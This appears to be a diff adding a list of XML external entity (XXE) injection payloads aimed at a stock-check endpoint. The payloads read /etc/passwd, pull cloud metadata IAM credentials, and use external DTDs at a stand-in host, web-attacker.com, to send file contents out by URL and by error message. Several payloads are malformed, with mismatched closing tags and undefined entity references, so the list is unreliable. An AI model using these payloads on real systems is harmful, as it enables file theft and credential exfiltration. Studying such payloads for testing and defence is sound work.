@@ -1,0 +1,82 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
+<stockCheck>
+    <productId>&toreplace;</productId>
+    <storeId>1</storeId>
+</stockCheck>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+<stockCheck>
+    <productId>&toreplace;</productId>
+    <storeId>1</storeId>
+</stockCheck>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
+<stockCheck>
+    <productId>&toreplace;</productId>
+    <storeId>1</storeId>
+</stockCheck>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ELEMENT stockCheck ANY>
+<!ENTITY file SYSTEM "file:///etc/passwd">]>
+<stockCheck>
+    <productId>&file;</productId>
+    <storeId>1</storeId>
+</stockCheck3>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]>
+<stockCheck>
+    <productId>&file;</productId>
+    <storeId>1</storeId>
+</stockCheck3>
+
+<!-- /etc/ -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]>
+<stockCheck>
+    <productId>&file;</productId>
+    <storeId>1</storeId>
+</stockCheck3>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<stockCheck>
+    <productId>&file;</productId>
+    <storeId>1</storeId>
+</stockCheck3>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
+<stockCheck>
+    <productId>&file;</productId>
+    <storeId>3;</storeId>
+</stockCheck3>
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+<stockCheck>
+    <productId>&file;</productId>
+    <storeId>3;</storeId>
+</stockCheck3>
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+<stockCheck>
+    <productId>&file;</productId>
+    <storeId>3;</storeId>
+</stockCheck3>
